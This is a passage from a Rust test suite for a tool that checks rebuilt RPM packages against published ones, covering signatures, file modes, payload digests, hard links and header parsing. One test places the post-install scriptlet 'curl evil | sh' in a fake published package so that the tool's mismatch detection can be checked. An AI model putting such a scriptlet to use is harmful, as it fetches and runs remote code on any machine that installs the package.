                5 => 8,
                _ => 1,
            };
            while store.len() % align != 0 {
                store.push(0);
            }
            for value in [*tag, *kind, store.len() as u32, *count] {
                index.extend_from_slice(&value.to_be_bytes());
            }
            store.extend_from_slice(data);
        }
        let mut out = HEADER_MAGIC.to_vec();
        out.extend_from_slice(&[0; 4]);
        out.extend_from_slice(&(tags.len() as u32).to_be_bytes());
        out.extend_from_slice(&(store.len() as u32).to_be_bytes());
        out.extend_from_slice(&index);
        out.extend_from_slice(&store);
        out
    }

    fn string_array(values: &[&[u8]]) -> (Vec<u8>, u32) {
        let mut data = Vec::new();
        for v in values {
            data.extend_from_slice(v);
            data.push(0);
        }
        (data, values.len() as u32)
    }

    fn cpio_entry(out: &mut Vec<u8>, ino: u32, mode: u32, nlink: u32, name: &[u8], data: &[u8]) {
        let fields = [
            ino,
            mode,
            0,
            0,
            nlink,
            0,
            data.len() as u32,
            0,
            0,
            0,
            0,
            name.len() as u32 + 1,
            0,
        ];
        out.extend_from_slice(b"070701");
        for f in fields {
            out.extend_from_slice(format!("{f:08x}").as_bytes());
        }
        out.extend_from_slice(name);
        out.push(0);
        out.resize(out.len().next_multiple_of(4), 0);
        out.extend_from_slice(data);
        out.resize(out.len().next_multiple_of(4), 0);
    }

    /// Write a package holding `files`, with the given scriptlet, as rpm does.
    fn package(dir: &Path, name: &str, files: &[FileSpec], postin: &[u8]) -> std::path::PathBuf {
        let paths: Vec<&[u8]> = files.iter().map(|f| f.0.as_bytes()).collect();
        let basenames: Vec<&[u8]> = paths
            .iter()
            .map(|p| &p[p.iter().rposition(|b| *b == b'/').unwrap() + 1..])
            .collect();
        let mut dirnames: Vec<&[u8]> = paths
            .iter()
            .map(|p| &p[..=p.iter().rposition(|b| *b == b'/').unwrap()])
            .collect();
        dirnames.dedup();
        let indexes: Vec<u8> = paths
            .iter()
            .flat_map(|p| {
                let dir = &p[..=p.iter().rposition(|b| *b == b'/').unwrap()];
                (dirnames.iter().position(|d| *d == dir).unwrap() as u32).to_be_bytes()
            })
            .collect();
        let modes: Vec<u8> = files
            .iter()
            .flat_map(|f| (f.1 as u16).to_be_bytes())
            .collect();
        let sizes: Vec<u8> = files
            .iter()
            .flat_map(|f| {
                let size = if f.1 & 0o170000 == 0o100000 {
                    f.2.len()
                } else {
                    0
                };
                (size as u32).to_be_bytes()
            })
            .collect();
        let digests: Vec<Vec<u8>> = files
            .iter()
            .map(|f| {
                if f.1 & 0o170000 == 0o100000 {
                    hex::encode(Sha256::digest(f.2)).into_bytes()
                } else {
                    Vec::new()
                }
            })
            .collect();
        let digest_refs: Vec<&[u8]> = digests.iter().map(Vec::as_slice).collect();
        let n = files.len() as u32;
        let (basenames, _) = string_array(&basenames);
        let (dirnames, dir_count) = string_array(&dirnames);
        let (digests, _) = string_array(&digest_refs);
        let mut postin = postin.to_vec();
        postin.push(0);
        let main = header(&[
            (1000, 6, b"test\0".to_vec(), 1),
            (1024, 6, postin, 1),
            (TAG_FILESIZES, 4, sizes, n),
            (TAG_FILEMODES, 3, modes, n),
            (TAG_FILEDIGESTS, 8, digests, n),
            (TAG_DIRINDEXES, 4, indexes, n),
            (TAG_BASENAMES, 8, basenames, n),
            (TAG_DIRNAMES, 8, dirnames, dir_count),
            (TAG_PAYLOADFORMAT, 6, b"cpio\0".to_vec(), 1),
            (TAG_PAYLOADCOMPRESSOR, 6, b"zstd\0".to_vec(), 1),
            (TAG_FILEDIGESTALGO, 4, 8u32.to_be_bytes().to_vec(), 1),
        ]);

        let mut cpio = Vec::new();
        for (i, (path, mode, data)) in files.iter().enumerate() {
            cpio_entry(
                &mut cpio,
                i as u32 + 1,
                *mode,
                1,
                format!(".{path}").as_bytes(),
                data,
            );
        }
        cpio_entry(&mut cpio, 0, 0, 1, b"TRAILER!!!", b"");

        let mut out = LEAD_MAGIC.to_vec();
        out.resize(LEAD_SIZE, 0);
        out.extend_from_slice(&header(&[]));
        out.extend_from_slice(&main);
        out.extend_from_slice(&zstd::encode_all(&cpio[..], 0).unwrap());
        let path = dir.join(name);
        std::fs::write(&path, out).unwrap();
        path
    }

    fn compare_specs(
        expected: &[FileSpec],
        actual: &[FileSpec],
        actual_postin: &[u8],
    ) -> PackageReport {
        let dir = TempDir::new().unwrap();
        let e = package(dir.path(), "rebuilt.rpm", expected, b"true");
        let a = package(dir.path(), "published.rpm", actual, actual_postin);
        compare(&e, &a, dir.path())
    }

    const MODULE: &str = "/lib/modules/6.1/kernel/fs/xfs.ko";

    #[test]
    fn module_signatures_are_expected() {
        let rebuilt = sign(b"\x7fELF xfs", b"rebuilt signature");
        let published = sign(b"\x7fELF xfs", b"published signatur");
        let report = compare_specs(
            &[
                ("/lib/modules/6.1", 0o40755, b""),
                (MODULE, 0o100644, &rebuilt),
                ("/usr/share/doc/README", 0o100644, b"readme"),
            ],
            &[
                ("/lib/modules/6.1", 0o40755, b""),
                (MODULE, 0o100644, &published),
                ("/usr/share/doc/README", 0o100644, b"readme"),
            ],
            b"true",
        );
        assert_eq!(report.status, Status::ExpectedDifference, "{report:?}");
        assert!(report.header.is_empty());
        assert_eq!(report.files.len(), 1);
        assert_eq!(report.files[0].path, MODULE);
    }

    #[test]
    fn kernel_image_is_a_warning() {
        let report = compare_specs(
            &[("/boot/vmlinuz", 0o100755, b"kernel with cert A")],
            &[("/boot/vmlinuz", 0o100755, b"kernel with cert B")],
            b"true",
        );
        assert_eq!(report.status, Status::Warning, "{report:?}");
    }

    #[test]
    fn other_differences_fail() {
        let module = sign(b"\x7fELF xfs", b"sig");
        let report = compare_specs(
            &[
                (MODULE, 0o100644, &module),
                ("/usr/bin/tool", 0o100755, b"rebuilt"),
                ("/usr/bin/link", 0o120777, b"tool"),
            ],
            &[
                (MODULE, 0o100644, &module),
                ("/usr/bin/tool", 0o100755, b"published"),
                ("/usr/bin/link", 0o120777, b"evil"),
            ],
            b"curl evil | sh",
        );
        assert_eq!(report.status, Status::Mismatch);
        assert_eq!(report.header, [r#"POSTIN: "true" vs "curl evil | sh""#]);
        let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(paths, ["/usr/bin/link", "/usr/bin/tool"]);
        assert_eq!(report.files[0].detail, "symlink target tool vs evil");
        assert!(report.files[1].detail.starts_with("contents differ"));
    }

    #[test]
    fn mode_differences_are_shown_by_file() {
        let report = compare_specs(
            &[("/usr/bin/tool", 0o100755, b"tool")],
            &[("/usr/bin/tool", 0o104755, b"tool")],
            b"true",
        );
        assert_eq!(report.status, Status::Mismatch);
        assert_eq!(report.header, ["FILEMODES: 33261 vs 35309"]);
        assert_eq!(report.files[0].detail, "mode 0755 vs 4755");
    }

    #[test]
    fn payload_must_match_its_header() {
        let dir = TempDir::new().unwrap();
        let e = package(
            dir.path(),
            "rebuilt.rpm",
            &[("/a", 0o100644, b"aaaa")],
            b"true",
        );
        let a = package(
            dir.path(),
            "published.rpm",
            &[("/a", 0o100644, b"bbbb")],
            b"true",
        );
        // Keep the published header but give it the rebuilt payload: every
        // compared file then matches, but not the digest its header records.
        let (_, mut reader) = read_package(&e).unwrap();
        let mut rebuilt_payload = Vec::new();
        reader.read_to_end(&mut rebuilt_payload).unwrap();
        let published = std::fs::read(&a).unwrap();
        let (_, mut reader) = read_package(&a).unwrap();
        let mut published_payload = Vec::new();
        reader.read_to_end(&mut published_payload).unwrap();
        let mut forged = published[..published.len() - published_payload.len()].to_vec();
        forged.extend_from_slice(&rebuilt_payload);
        std::fs::write(&a, forged).unwrap();

        let report = compare(&e, &a, dir.path());
        assert_eq!(report.status, Status::Mismatch);
        assert_eq!(report.files.len(), 1);
        assert!(report.files[0]
            .detail
            .contains("in the published payload, but its header records"));
    }

    #[test]
    fn hard_links_share_contents() {
        let mut cpio = Vec::new();
        cpio_entry(&mut cpio, 7, 0o100755, 2, b"./usr/bin/a", b"");
        cpio_entry(&mut cpio, 7, 0o100755, 2, b"./usr/bin/b", b"shared");
        cpio_entry(&mut cpio, 0, 0, 1, b"TRAILER!!!", b"");
        let mut file = tempfile::tempfile().unwrap();
        file.write_all(&cpio).unwrap();
        let entries = Payload::index(&file, cpio.len() as u64).unwrap();
        let (a, b) = (
            &entries[&b"/usr/bin/a".to_vec()],
            &entries[&b"/usr/bin/b".to_vec()],
        );
        assert_eq!((a.0.offset, a.1.size), (b.0.offset, 6));
    }

    #[test]
    fn rejects_contents_on_other_hard_links() {
        let mut cpio = Vec::new();
        cpio_entry(&mut cpio, 7, 0o100755, 2, b"./usr/bin/a", b"checked");
        cpio_entry(&mut cpio, 7, 0o100755, 2, b"./usr/bin/b", b"installed");
        cpio_entry(&mut cpio, 0, 0, 1, b"TRAILER!!!", b"");
        let mut file = tempfile::tempfile().unwrap();
        file.write_all(&cpio).unwrap();
        let err = Payload::index(&file, cpio.len() as u64).unwrap_err();
        assert!(err.to_string().contains("only its last link"), "{err}");
    }

    #[test]
    fn rejects_overlapping_header_entries() {
        let int8s = vec![0u8; 64];
        let mut data = header(&[(1000, 2, int8s.clone(), 64), (1001, 2, int8s, 64)]);
        // Point the second entry at the first one's data.
        data[16 + 16 + 8..16 + 16 + 12].copy_from_slice(&0u32.to_be_bytes());
        data.truncate(data.len() - 64);
        data[12..16].copy_from_slice(&64u32.to_be_bytes());
        let err = read_header(&mut &data[..]).unwrap_err();
        assert!(err.to_string().contains("cover more than"), "{err}");
    }

    #[test]
    fn decodes_tag_values() {
        let (strings, count) = string_array(&[b"a", b"", b"bc"]);
        let data = header(&[
            (1000, TYPE_STRING_ARRAY, strings, count),
            (1001, 3, vec![0, 1, 0x12, 0x34], 2),
            (1002, TYPE_BIN, b"\0\x01".to_vec(), 2),
            (1003, TYPE_STRING, b"x\0".to_vec(), 1),
        ]);
        let header = read_header(&mut &data[..]).unwrap();
        let strings: Vec<&[u8]> = vec![b"a", b"", b"bc"];
        assert_eq!(header.strings(1000).unwrap(), strings);
        assert_eq!(header.ints(1001).unwrap(), [1, 0x1234]);
        assert!(header
            .get(1002)
            .unwrap()
            .describe()
            .starts_with("2 bytes, sha256 "));
        assert_eq!(header.first_string(1003).unwrap(), b"x");
        assert_eq!(header.get(1000).unwrap().len(), 3);
    }

    #[test]
    fn only_file_tags_are_shown_by_file() {
        let paths = [b"/a".to_vec(), b"/b".to_vec()];
        let tags = |value: &[u8]| {
            let (values, count) = string_array(&[value, b"same"]);
            // FILELINKTOS and REQUIRENAME.
            let data = header(&[
                (1036, TYPE_STRING_ARRAY, values.clone(), count),
                (1049, TYPE_STRING_ARRAY, values, count),
            ]);
            read_header(&mut &data[..]).unwrap()
        };
        assert_eq!(
            compare_headers(&tags(b"e"), &tags(b"a"), &paths, &paths),
            [
                r#"FILELINKTOS of /a: "e" vs "a""#,
                r#"REQUIRENAME[0]: "e" vs "a""#,
            ]
        );
    }

    #[test]
    fn rejects_payloads_over_the_limit() {
        let mut cpio = Vec::new();
        cpio_entry(&mut cpio, 1, 0o100644, 1, b"./big", &[0; 4096]);
        cpio_entry(&mut cpio, 0, 0, 1, b"TRAILER!!!", b"");
        let dir = TempDir::new().unwrap();
        for (compressor, compressed) in [
            ("zstd", zstd::encode_all(&cpio[..], 0).unwrap()),
            ("xz", liblzma::encode_all(&cpio[..], 6).unwrap()),
        ] {
            let data = header(&[(
                TAG_PAYLOADCOMPRESSOR,
                TYPE_STRING,
                format!("{compressor}\0").into_bytes(),
                1,
            )]);
            let tags = read_header(&mut &data[..]).unwrap();
            assert!(Payload::unpack(&tags, &mut &compressed[..], dir.path(), 1024).is_err());
            let payload =
                Payload::unpack(&tags, &mut &compressed[..], dir.path(), 1 << 20).unwrap();
            assert!(
                payload.entries.contains_key(b"/big".as_slice()),
                "{compressor}"
            );
        }
    }
}
